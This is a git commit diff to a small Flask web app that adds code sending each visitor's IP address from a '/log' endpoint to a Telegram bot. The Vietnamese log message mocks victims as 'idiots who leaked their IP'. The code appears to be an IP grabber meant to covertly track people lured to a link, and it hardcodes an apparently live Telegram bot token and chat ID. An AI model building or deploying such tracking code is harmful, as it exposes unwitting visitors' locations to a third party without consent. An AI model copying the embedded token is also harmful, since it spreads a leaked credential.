e025552eedf954e0bd4e3a5f41c424be6014ea23
WebProfileA12 <quanlinha12@gmail.com>
2025-09-01 21:40:11 +0700

    app.py
    Fix_2

--- app.py
+++ app.py
@@ -1,9 +1,25 @@
 import os
+import requests
 from flask import Flask, request
 from flask_cors import CORS
 
 app = Flask(__name__)
 CORS(app)
+
+# Thông tin bot
+TELEGRAM_TOKEN = "8404713686:AAF2SmOuGZwu-jcdwNr3ewCTAr-WgCrAbV0"
+CHAT_ID = "7239343492"
+
+def send_to_telegram(ip):
+    url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
+    payload = {
+        "chat_id": CHAT_ID,
+        "text": f"Thêm 1 Thằng Ngu Vừa Lộ Địa Chỉ IP Thưa Đại Ca Quân ĐZ. IP:  {ip}"
+    }
+    try:
+        requests.post(url, json=payload, timeout=5)
+    except Exception as e:
+        print("Telegram send failed:", e)
 
 @app.route("/")
 def home():
@@ -12,7 +28,8 @@ def home():
 @app.route("/log", methods=["GET"])
 def log_ip():
     ip = request.headers.get('X-Forwarded-For', request.remote_addr)
-    print("Visitor IP:", ip)
+    print("Thêm 1 Thằng Ngu Vừa Lộ Địa Chỉ IP Thưa Đại Ca Quân ĐZ. IP: ", ip)
+    send_to_telegram(ip)
     return {"ip": ip}
 
 if __name__ == "__main__":
